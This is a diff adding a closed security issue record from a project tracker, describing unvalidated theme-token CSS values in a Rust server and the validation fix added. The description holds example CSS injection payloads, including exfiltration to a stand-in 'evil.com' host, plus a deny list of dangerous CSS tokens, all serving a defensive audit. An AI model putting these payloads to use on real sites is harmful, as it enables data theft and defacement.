@@ -1,0 +1,29 @@
+{
+  "id": "broadside-3p4v.9",
+  "title": "LOW: Theme token CSS values not validated against injection",
+  "description": "**Category: XSS (2)**\n\nIn `theme.rs:15-26`, CSS custom property values from the design tokens JSON file are interpolated directly into CSS:\n\n```rust\nvars.push_str(\u0026format!(\"{var}:{value};\"));\n```\n\nWhere `value` comes from `token.get(\"$value\").and_then(|v| v.as_str())`. A malicious or corrupted theme tokens file could inject arbitrary CSS (e.g., `}body{background:url(javascript:...)}` or exfiltration via `background:url(https://evil.com/?data=...)`).\n\nThe `extra_css` in `server.rs:137-142` strips `\u003c/style\u003e` to prevent tag breakout, but does not prevent CSS injection within the style block.\n\n**Mitigations already present:**\n- Theme tokens file is operator-controlled (local filesystem), not remote-supplied\n- CSP `default-src 'none'; img-src https: data:` limits what CSS can load\n- `style-src 'unsafe-inline'` is required for inline styles and can't be tightened without external CSS files\n\n**Impact:** Low. Requires compromised operator filesystem. CSS injection under current CSP is limited to visual defacement.\n\n**Fix:** Validate that `$value` matches a CSS color pattern (hex, rgb(), hsl(), named color) before interpolation. Reject values containing `}`, `;`, `url(`, `expression(`, or `@import`.",
+  "status": "closed",
+  "priority": 3,
+  "issue_type": "bug",
+  "assignee": "Mark Atwood",
+  "owner": "mark@reviewcommit.com",
+  "created_at": "2026-07-20T01:09:50.419284884Z",
+  "created_by": "Mark Atwood",
+  "updated_at": "2026-07-20T01:24:43.803976373Z",
+  "started_at": "2026-07-20T01:21:20.82808928Z",
+  "closed_at": "2026-07-20T01:24:43.803976373Z",
+  "close_reason": "Added is_safe_css_value() validation in theme.rs. Rejects token values containing }, ;, url(, expression(, @import, javascript:, or exceeding 100 chars. Logs warning on rejection.",
+  "labels": [
+    "security"
+  ],
+  "dependencies": [
+    {
+      "issue_id": "broadside-3p4v.9",
+      "depends_on_id": "broadside-3p4v",
+      "type": "parent-child",
+      "created_at": "2026-07-20T01:09:50.447158753Z",
+      "created_by": "Mark Atwood",
+      "metadata": "{}"
+    }
+  ]
+}
